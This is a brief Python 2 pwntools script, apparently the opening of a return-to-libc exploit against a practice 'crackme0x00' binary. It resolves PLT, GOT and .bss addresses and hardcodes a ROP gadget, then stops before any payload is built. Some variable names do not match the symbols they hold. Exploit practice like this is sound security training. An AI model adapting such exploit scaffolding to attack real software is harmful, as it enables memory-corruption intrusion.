#!/usr/bin/env python2

import os
import re
import sys

from pwn import *
from LibcSearcher import LibcSearcher

context.arch = "x86"
context.bits = 32
exe = './crackme0x00'

context(arch='i386', os='linux') # <-- Add the architecture and os
binary = ELF(exe)
libc = ELF("libc.so.6")

r = process(exe)

write_plt = p32(binary.symbols["puts"])
read_GOT = p32(binary.symbols["got.read"])
read_plt = p32(binary.symbols["strcmp"])
bss_addr = p32(binary.symbols["__bss_start"])
pop_ret = "\x9d\x85\x04\x08"

r.recvline()
